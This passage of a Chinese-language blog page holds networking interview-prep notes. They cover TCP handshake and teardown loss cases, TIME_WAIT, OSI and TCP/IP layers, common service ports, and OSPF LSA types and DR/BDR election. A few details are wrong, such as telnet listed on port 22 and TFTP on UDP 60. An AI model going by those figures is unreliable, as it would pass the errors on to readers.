data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/7bc94edb74608af80fbb4de8ab9c1bd7.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/11bd3c08694c9f869c3607fe32edb8ff.png\" alt=\"img\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">timewait的作用：</span><br><span class=\"line\">为了确保最后的 ACK 能让被动关闭方接收，从而帮助其正常关闭。</span><br><span class=\"line\">在这里，如果图中主机 1 的 ACK 报文没有传输成功，那么主机 2 就会重新发送 FIN 报文。如果主机 1 没有维护 TIME_WAIT 状态，而直接进入 CLOSED 状态，它就失去了当前状态的上下文，只能回复一个 RST 操作，从而导致被动关闭方出现错误。而重发fin一来一去正好两个MSL</span><br><span class=\"line\">让之前因为某些原因延迟到达路由器的报文消失，如果关闭的连接被重用了，那么这些延迟收到的包就有可能会跟新连接混在一起</span><br><span class=\"line\">time-wait是从主机A收到FIN后发送ack开始计时的</span><br><span class=\"line\"></span><br><span class=\"line\">timewait的危害</span><br><span class=\"line\">第一是内存资源占用</span><br><span class=\"line\">第二是对端口资源的占用，一个 TCP 连接至少消耗一个本地端口。</span><br></pre></td></tr></table></figure>\n<h4 id=\"为啥挥四次握三次长亭\"><a class=\"markdownIt-Anchor\" href=\"#为啥挥四次握三次长亭\">#</a> 为啥挥四次握三次 (长亭)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">为了保证A发送的最有一个ACK报文段能够到达B。</span><br><span class=\"line\">没有数据传输，服务端的SYN和ACK报文可以一起发送，但是挥手时有数据传输,等待自己的数据传输完成后再ACK，ACK和FIN报文不能同时发送</span><br></pre></td></tr></table></figure>\n<h4 id=\"接下来是八股文时间~\"><a class=\"markdownIt-Anchor\" href=\"#接下来是八股文时间~\">#</a> 接下来是八股文时间：~</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x00 TCP第一次握手SYN包丢包</span><br><span class=\"line\">重传第一个包，重传次数由/proc/sys/net/ipv4/tcp_syn_retries决定，每次重传的时间翻倍上涨的，直至达到tcp_syn_retries决定，不在重传，开始摆烂</span><br><span class=\"line\">1 2 4 8 16 32 酱紫翻倍的</span><br><span class=\"line\"></span><br><span class=\"line\">0x01 TCP第二次握手SYN包丢包</span><br><span class=\"line\">客户端无法收到synack包，会重传syn。</span><br><span class=\"line\">服务端收到客户的SYN包后，就会回SYN、ACK包，但是客户端一直没有回ACK，服务端在超时后，重传了 </span><br><span class=\"line\">SYN、ACK 包，接着一会，客户端超时重传的SYN包又抵达了服务端，服务端收到后，超时定时器就重新</span><br><span class=\"line\">计时，然后回SYN、ACK包，所以相当于服务端的超时定时器只触发了一次，又被重置了；</span><br><span class=\"line\">当第二次握手的SYN、ACK丢包时，客户端会超时重发SYN包，服务端也会超时重传SYN、ACK包。同时客户端重传次数由tcp_syn_retries决定</span><br><span class=\"line\"></span><br><span class=\"line\">0x02</span><br><span class=\"line\">TCP第三次握手SYN包丢包</span><br><span class=\"line\">如果第三次握手的ACK，服务端无法收到，则服务端就会短暂处于SYN_RECV状态，并且依次等待3秒、6秒、12秒后重新发送SYN+ACK包，而客户端会处于 ESTABLISHED 状态。由于服务端一直收不到TCP第三次握手的ACK，则会一直重传SYN、ACK包，直到重传次数超过tcp_synack_retries,直至重传次数超过tcp_synack_retries</span><br><span class=\"line\"></span><br><span class=\"line\">0x03</span><br><span class=\"line\">// 第一次握手重传次数限制</span><br><span class=\"line\">cat /proc/sys/net/ipv4/tcp_syn_retries</span><br><span class=\"line\"></span><br><span class=\"line\">// 第二次握手重传次数限制</span><br><span class=\"line\">cat /proc/sys/net/ipv4/tcp_synack_retries</span><br><span class=\"line\"></span><br><span class=\"line\">// 数据包最大重传次数限制</span><br><span class=\"line\">cat /proc/sys/net/ipv4/tcp_retries2</span><br><span class=\"line\"></span><br><span class=\"line\">参考链接：https://juejin.cn/post/6844904181795389454</span><br><span class=\"line\">师傅在文章里还有详细截图，看不懂我写的可以去看他写的~</span><br><span class=\"line\"></span><br><span class=\"line\">0x04 TCP第一次挥手FIN包丢包</span><br><span class=\"line\">client发的FIN包丢了，对于client，因为没收对应的ACK包，应当一直重传(像普通包一样)，直至到达上限次数，直接关闭连接；对于server，它应该无任何感知；</span><br><span class=\"line\"> </span><br><span class=\"line\">0x05 TCP第二次挥手ACK包丢包</span><br><span class=\"line\">server回client的ACK包丢了，对于client，将执行（1），对于server将像丢普通的ack一样，再次收到FIN后，再发一个ACK包；</span><br><span class=\"line\"></span><br><span class=\"line\">0x06 TCP第三次挥手FIN包丢包</span><br><span class=\"line\">如果client收到ACK后，server直接跑路。client将永远停留在这个状态（半打开状态，就像client关闭了输出一样）。linux有tcp_fin_timeout这个参数，设置一个超时时间 cat /proc/sys/net/ipv4/tcp_fin_timeout 查看，默认60s。</span><br><span class=\"line\">server发的FIN包丢了，对于server，像丢普通的包一样，重传。若此时client早已跑路且与其他人建立的连接，client应会不认识这个FIN包，直接回个RST包给server。如若client没跑路，且没收到server的FIN包，如（3）描述；</span><br><span class=\"line\"></span><br><span class=\"line\">0x07 TCP第三次挥手ACK包丢包</span><br><span class=\"line\">防止回复的ACK包丢失（丢失后，server因为没收FIN的ACK，所以会再发一个FIN），将等待2MSL(最大报文存活时间)</span><br><span class=\"line\"></span><br><span class=\"line\">0x08 大结局</span><br><span class=\"line\">syn = 1丢了 计时器超时后重传第一个包(syn=1)</span><br><span class=\"line\">syn = 1, ack = 1丢了 重传第一个(syn=1)和第二个包(syn=1,ack=1)</span><br><span class=\"line\">ack = 1丢了 等待3秒、6秒、12秒后重新发送第二个(syn=1,ack=1)包</span><br><span class=\"line\">客户端fin = 1丢了 重传第一个包(fin=1)</span><br><span class=\"line\">服务端ack = 1丢了 重传第一个(fin=1)和第二个包(ack=1)</span><br><span class=\"line\">服务端fin = 1丢了 服务端重传第三个包(fin=1),client行为分类讨论，如果已经和别人建立了连接，那么回RST，如果没跑路，那么client将永远停留在这个状态(fin-wait)</span><br><span class=\"line\">客户端ack = 1丢了 服务端重传第三个包(fin=1),客户端等待Time-wait，即2MSL</span><br><span class=\"line\">如果他接下来再问你wait-time是干啥的，你直接创他</span><br><span class=\"line\">但我上面写了，别说我没写</span><br><span class=\"line\"></span><br><span class=\"line\">链接：https://www.cnblogs.com/quehualin/p/10409607.html</span><br><span class=\"line\">这个师傅写得很详细，师傅流啤~</span><br></pre></td></tr></table></figure>\n<h4 id=\"连续收到三个ack怎么办云智\"><a class=\"markdownIt-Anchor\" href=\"#连续收到三个ack怎么办云智\">#</a> 连续收到三个 ack 怎么办（云智）</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">即，当TCP源端收到3个相同的ACK确认时，即认为有数据包丢失，则源端重传丢失的数据包，而不必等待RTO(Retransmission Timeout)超时。</span><br><span class=\"line\">https://www.ppkanshu.com/post/4505.html</span><br></pre></td></tr></table></figure>\n<h3 id=\"4osi相关\"><a class=\"markdownIt-Anchor\" href=\"#4osi相关\">#</a> 4.OSI 相关</h3>\n<h4 id=\"路由协议分类宏杉中科曙光信锐\"><a class=\"markdownIt-Anchor\" href=\"#路由协议分类宏杉中科曙光信锐\">#</a> 路由协议分类 (宏杉，中科曙光，信锐)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">从大类分，分为BGP和IGP 即内部网关和边界网关协议</span><br><span class=\"line\">BGP 中只有BGP这一个协议,BGP 又可以称为路径矢量型协议</span><br><span class=\"line\">IGP 中可以分为两大类：</span><br><span class=\"line\">\t距离矢量: RIP,EIGRP(高级的距离矢量型协议，Cisco私有)</span><br><span class=\"line\">\t链路状态：ISIS ,OSPF</span><br><span class=\"line\">然后慢慢扩展吧，千万别说完这个就不说了，你说说每个协议的应用场景等</span><br></pre></td></tr></table></figure>\n<h4 id=\"ositcpip区别\"><a class=\"markdownIt-Anchor\" href=\"#ositcpip区别\">#</a> osi/tcpip 区别</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">OSI:\t\t\t\t\t\t\tTCP/IP</span><br><span class=\"line\">应用层\t\t\t\t\t\t\t应用层\t\t</span><br><span class=\"line\">表示层\t\t\t</span><br><span class=\"line\">会话层</span><br><span class=\"line\">传输层\t\t\t\t\t\t\t传输层</span><br><span class=\"line\">网络层\t\t\t\t\t\t\t网路层</span><br><span class=\"line\">数据链路层\t\t\t\t\t  网络接口层</span><br><span class=\"line\">网络层</span><br><span class=\"line\"></span><br><span class=\"line\">层数不同—-OSI为7层，TCP/IP为四层或五层</span><br><span class=\"line\">TCP/IP支持跨层封装；OSI不支持  跨层封装主要用于非终端设备间相互沟通的流量，非远距离；</span><br><span class=\"line\">TCP/IP仅仅支持IP网络协议;  OSI支持多种网络层协议（IP    IPX    APPLE  TALK    NOVELL   NSAP）</span><br><span class=\"line\">TCP/IP 参考模型没有对网络接口层进行细分，只是一些概念性的描述； OSI 参考模型对服务和协议做了明确的区分。</span><br><span class=\"line\">OSI 先有模型，后有协议规范，适合于描述各种网络；TCP/IP 是先有协议集然后建立模型，不适用于非 TCP/IP 网络。</span><br><span class=\"line\">TCP/IP 一开始就提出面向连接和无连接服务，而 OSI 一开始只强调面向连接服务，直到很晚才开始制定无连接的服务标准。</span><br><span class=\"line\">OSI 实现起来较困难；相反，TCP/IP作为一种简化的分层结构还是比较成功的。</span><br></pre></td></tr></table></figure>\n<h4 id=\"二层三层交换机的区别深信服\"><a class=\"markdownIt-Anchor\" href=\"#二层三层交换机的区别深信服\">#</a> 二层三层交换机的区别 (深信服)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">二层交换机属数据链路层设备</span><br><span class=\"line\">三层交换机工作在网络层</span><br><span class=\"line\"></span><br><span class=\"line\">二层交换机的原理是当交换机从某个端口收到一个数据包，它会先读取包中的源MAC地址，再去读取包中的目的MAC地址，并在地址表中查找对应的端口，如表中有和目的MAC地址对应的端口，就把数据包直接复制到这个端口上。</span><br><span class=\"line\">三层交换机的原理比较简单，就是一次路由多次交换，通俗来说就是第一次进行源到目的的路由，三层交换机会将此数据转到二层，那么下次无论是目的到源还是源到目的都可以进行快速交换。</span><br><span class=\"line\"></span><br><span class=\"line\">二层交换机基于MAC地址访问，只做数据的转发，并且不能配置IP地址</span><br><span class=\"line\">三层交换机将二层交换技术和三层转发功能结合在一起，也就是说三层交换机在二层交换机的基础上增加了路由功能，可配置不同VLAN的IP地址，可通过三层路由实现不同VLAN之间通讯。</span><br><span class=\"line\"></span><br><span class=\"line\">二层交换机主要用于网络接入层和汇聚层</span><br><span class=\"line\">三层交换机主要用于网络核心层，但是也存在少部分三层交换机用于汇聚层的现象</span><br></pre></td></tr></table></figure>\n<h4 id=\"osi每层协议长亭招联中科曙光\"><a class=\"markdownIt-Anchor\" href=\"#osi每层协议长亭招联中科曙光\">#</a> OSI 每层协议 (长亭，招联，中科曙光)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">应用层:</span><br><span class=\"line\">http/https 80/443</span><br><span class=\"line\">dns 53</span><br><span class=\"line\">snmp 161/162</span><br><span class=\"line\">smtp 25</span><br><span class=\"line\">ftp 20/21</span><br><span class=\"line\">pop3 110</span><br><span class=\"line\">telnet 22</span><br><span class=\"line\"></span><br><span class=\"line\">表示层</span><br><span class=\"line\">GIF</span><br><span class=\"line\">JPEG</span><br><span class=\"line\">ASCII</span><br><span class=\"line\">HTML</span><br><span class=\"line\">encryption</span><br><span class=\"line\"></span><br><span class=\"line\">会话层：</span><br><span class=\"line\">NetBIOS</span><br><span class=\"line\">AppleTalk</span><br><span class=\"line\">NFS</span><br><span class=\"line\"></span><br><span class=\"line\">传输层：</span><br><span class=\"line\">tcp</span><br><span class=\"line\">udp</span><br><span class=\"line\"></span><br><span class=\"line\">网络层：</span><br><span class=\"line\">IP，IPX</span><br><span class=\"line\"></span><br><span class=\"line\">数据链路层</span><br><span class=\"line\">FR</span><br><span class=\"line\">HDLC</span><br><span class=\"line\">PPP</span><br><span class=\"line\">802.3</span><br><span class=\"line\">ATM</span><br><span class=\"line\"></span><br><span class=\"line\">物理层</span><br><span class=\"line\">RJ45</span><br><span class=\"line\">Ethernet</span><br><span class=\"line\"></span><br><span class=\"line\">TCP/IP</span><br><span class=\"line\">应用层：参考OSI</span><br><span class=\"line\">传输层：TCP,UDP</span><br><span class=\"line\">网络层：ICMP，IGMP</span><br><span class=\"line\">数据链路层：ARP</span><br><span class=\"line\"></span><br><span class=\"line\">你真想混起来将我觉得也没事，估计面试官也分不清楚，我之前一致混起来讲的，面试官听得挺开心，我讲的也挺开心~</span><br><span class=\"line\">毕竟分太细容易把自己埋了，他不问你不说，大家dddd</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">顺带着我就把常见端口写了</span><br><span class=\"line\">http/https tcp 80/443</span><br><span class=\"line\">dns tcp+udp 53</span><br><span class=\"line\">snmp udp 161/162</span><br><span class=\"line\">smtp tcp 25</span><br><span class=\"line\">ftp tcp 20/21</span><br><span class=\"line\">pop3 tcp 110</span><br><span class=\"line\">telnet 23</span><br><span class=\"line\">dhcp 67/68</span><br><span class=\"line\">ssh 22</span><br><span class=\"line\">tftp udp 60</span><br><span class=\"line\">JBOSS  Tomcat 8080</span><br><span class=\"line\">RDP 3389</span><br><span class=\"line\">Oracle 1521</span><br><span class=\"line\">mssql tcp/udp 1433,1434</span><br><span class=\"line\">mysql 3306</span><br><span class=\"line\">samba 139</span><br><span class=\"line\">ladp 389</span><br><span class=\"line\">redis 6379</span><br><span class=\"line\">weblogic 7001</span><br></pre></td></tr></table></figure>\n<h4 id=\"封装解封装长亭\"><a class=\"markdownIt-Anchor\" href=\"#封装解封装长亭\">#</a> 封装解封装 (长亭)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">应用层，人机交互接口，接收用户输入</span><br><span class=\"line\">表示层，将接收到的数据翻译成二进制数组成的计算机语言，并对数据进行压缩和解压、数据加密和解密等工作</span><br><span class=\"line\">会话层，建立、管理、中止会话。</span><br><span class=\"line\">传输层，为每个数据封装 TCP或UDP 报文头部。 在头部有一个关键的字段信息——端口号，它用于标识上层的协议或应用程序，确保上层应用数据的正常通信。</span><br><span class=\"line\">网络层，上层数据被封装上新的报文头部——IP 头部。 在 IP 头部中有一个关键的字段信息——IP 地址，进行逻辑地址寻址</span><br><span class=\"line\">数据链路层，上层数据被封装一个 MAC 头部，其内部有一个关键的字段信息 ——MAC 地址，在 MAC 头部也同时封装着目标 MAC 地址和源 MAC 地址，进行硬件地址寻址、差错校验等功能。</span><br><span class=\"line\">在物理层，将这些二进制数字组成的比特流转换成电信号在网络中传输。</span><br><span class=\"line\"></span><br><span class=\"line\">在物理层，首先将电信号转换成二进制数据，并将数据送至数据链路层</span><br><span class=\"line\">在数据链路层， 将查看目标 MAC 地址，判断其是否与自己的 MAC 地址吻合，并据此完成后续处理。如果 数据报文的目标 MAC 地址就是自己的 MAC 地址，数据的 MAC 头部将被“拆掉”，并将剩余 的数据送至上一层；如果目标 MAC 地址不是自己的 MAC 地址，对于终端设备来说，它将 会丢弃数据</span><br><span class=\"line\">在网络层与在数据链路层类似，目标 IP 地址将被核实是否与自己的 IP 地址相 同，从而确定是否送至上一层</span><br><span class=\"line\">到了传输层，首先要根据 TCP 头部判断数据段送往哪个应用层协议或应用程序，然后将之前被分组的数据段重组，再送往应用层</span><br><span class=\"line\">会话层，建立、管理、中止会话。</span><br><span class=\"line\">表示层，将接收到的二进制变为应用的数据，并对数据进行压缩和解压、数据加密和解密等工作</span><br><span class=\"line\">在应用层，这些数据将经历复杂的解码过程，以还原发送者所传输的原始信息。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"5ospf相关\"><a class=\"markdownIt-Anchor\" href=\"#5ospf相关\">#</a> 5.OSPF 相关</h3>\n<h4 id=\"ospf负载分担快手\"><a class=\"markdownIt-Anchor\" href=\"#ospf负载分担快手\">#</a> ospf 负载分担 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">华为产品文档ospf cost命令原话</span><br><span class=\"line\">当有多条发现协议、开销值、目的地址都相同的路由时，这几条路由就满足负载分担的条件。请根据实际组网情况，通过修改接口开销值来选择是否需要进行负载分担。</span><br></pre></td></tr></table></figure>\n<h4 id=\"需要a-b不负载分担回程不管在哪配开销来回路径不一致有问题吗快手\"><a class=\"markdownIt-Anchor\" href=\"#需要a-b不负载分担回程不管在哪配开销来回路径不一致有问题吗快手\">#</a> 需要 A-&gt;B 不负载分担，回程不管，在哪配开销，来回路径不一致有问题吗（快手）</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在A配，因为A发送时需要查看路由表，只有路由表中没有开销相同的路由才不会负载分担</span><br><span class=\"line\"></span><br><span class=\"line\">路由来回路径不一致虽然还是可以通信，但是可能会出现偶尔访问慢或规律丢包等现象。</span><br><span class=\"line\">因此可考虑配置路由优先级或冗余端口来实现主备。</span><br><span class=\"line\">但对安全设备来说，有影响，可能对应报文会被丢弃。</span><br><span class=\"line\"></span><br><span class=\"line\">华为中fw可以如下操作：</span><br><span class=\"line\">如果出现来回路径不一致情况，不管是在路由模式下，还是在透明模式下，此时默认都是开启的链路状态检测。要解决这个问题，关闭链路状态检测即可，即：</span><br><span class=\"line\">undo firewall session link-state check</span><br></pre></td></tr></table></figure>\n<h4 id=\"单区域网络类型p2p有几种lsa快手\"><a class=\"markdownIt-Anchor\" href=\"#单区域网络类型p2p有几种lsa快手\">#</a> 单区域网络类型 P2P 有几种 LSA (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">只有1类</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020210537797.png\" alt=\"image-20221020210537797\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020210832630.png\" alt=\"image-20221020210832630\"></p>\n<h4 id=\"54lsa常见类型快手\"><a class=\"markdownIt-Anchor\" href=\"#54lsa常见类型快手\">#</a> 5.4LSA 常见类型 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1类LSA 每台运行ospf协议的路由器都会产生，用于描述加入到OSPF进程中自身直连链路的状态。有路由和拓扑信息</span><br><span class=\"line\">2类LSA 携带DR的router-id，DR接口子网掩码，伪节点的邻居，单区域p2p是没有2类的，有路由和拓扑信息</span><br><span class=\"line\">3类LSA 在区域间传递LSA，只有路由信息</span><br><span class=\"line\">4类LSA ABR产生，描述了ASBR的位置，类似路由信息</span><br><span class=\"line\">5类LSA 外部LSA，携带重发布的路由信息，只有路由信息</span><br><span class=\"line\">7类LSA NSSA区域引入外部路由时产生</span><br></pre></td></tr></table></figure>\n<h4 id=\"55ospf防环快手\"><a class=\"markdownIt-Anchor\" href=\"#55ospf防环快手\">#</a> 5.5OSPF 防环 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">区域内通过spf防环</span><br><span class=\"line\">区域间通过：</span><br><span class=\"line\">\t区域间水平分割(1类，2类优于3类，骨干3类优于非骨干3类)</span><br><span class=\"line\">\t区域设计原则(非骨干必须和骨干直接相连)</span><br><span class=\"line\">\tABR(只有ABR能产生泛洪3类LSA)</span><br><span class=\"line\">区域间防环:</span><br><span class=\"line\">\t5类LSA在整个区域泛洪时link id,adv rtr,type 都不改变</span><br><span class=\"line\">\tASBR同一区域的路由器通过SPF计算出去往ASBR的无环路径，即通过1类2类防环</span><br><span class=\"line\">\tASBR不同区域的路由器通过4类LSA防环，4类防环规则与3类一致</span><br></pre></td></tr></table></figure>\n<h4 id=\"56spf算法快手\"><a class=\"markdownIt-Anchor\" href=\"#56spf算法快手\">#</a> 5.6SPF 算法 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://blog.csdn.net/qq_57686163/article/details/123466172</span><br><span class=\"line\">这篇文章师傅写的很明白了，我不想写了，摆烂</span><br></pre></td></tr></table></figure>\n<h4 id=\"57drbdr宏杉\"><a class=\"markdownIt-Anchor\" href=\"#57drbdr宏杉\">#</a> 5.7DR，BDR (宏杉)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">基于链路选择。即在每一条广播型链路或NBMA链路都需要进行DR，BDR选举，BDR可选存在。即在每一条广播型链路或NBMA链路上DR只有一个，BDR如果存在有且只有一个</span><br><span class=\"line\">DR只会从DR的合集当中竞选，BDR只会从BDR的合集当中竞选。如果集合当中有路由器，优先从集合当中竞选。</span><br><span class=\"line\"></span><br><span class=\"line\">DR选举(包含在hello包内)：  1.比较优先级 （范围：0-255，默认优先级为1 ，越大越优）  </span><br><span class=\"line\">2.比较各自的router-id，越大越优</span><br><span class=\"line\"></span><br><span class=\"line\">1.DR抢占是关闭的      </span><br><span class=\"line\">3.优先级范围0-255，数字为0代表不参与选举，默认为1，若两个直连路由器优先级都为0，则不能学习LSA，只能维持邻居关系  </span><br><span class=\"line\">4.先选举BDR ，再升级为DR  (BDR备份路由器，当BDR选举超过40秒后(=dead time),升级为DR，将剩下最优的作为BDR)</span><br><span class=\"line\">当DR BDR选举完成时，会给224.0.0.6发送组播传递LSA，且只有DR和BDR才会接收，DR和BDR在用224.0.0.5发送给所有</span><br></pre></td></tr></table></figure>\n<h4 id=\"58ospf建立邻居\"><a class=\"markdownIt-Anchor\" href=\"#58ospf建立邻居\">#</a> 5.8ospf 建立邻居</h4>\n<blockquote>\n<p>Down: 这是邻居的初始状态，表示没有从邻居收到任何信息。</p>\n<p>Init: 判断邻居参数可以建立邻居后 init。在此状态下，路由器已经从邻居收到了 Hello 报文，但是自己的 router-id 不在所收到的 Hello 报文的邻居列表中，表示尚未与邻居建立双向通信关系，可以称为 one-way。在此状态下的邻居要被包含在自己所发送的 Hello 报文的邻居列表中。</p>\n<p>2-Way: 在此状态下，收到邻居 hello 包，并从 hello 包中发现自己 router-id。两台路由器已确认可以双向通信，邻居关系已经建立；但是还没有建立邻接关系。若发送方收到的 hello 包中有自己 id，可以直接进入 two-way。这是建立邻接关系以前的最高级状态。如果网络为广播网络或者 NBMA 网络则选举 DR/BDR。drother 之间停留此状态，不会进行 LSDB 同步，其他情况会继续进行 LSDB 同步</p>\n<p>exstart 状态，开始发送 DBD 报文。主要完成主从选举，为可靠的 LSDB 同步做准备工作，不会携带任何 LSDB 中 LSA 头部信息</p>\n<p>exchange 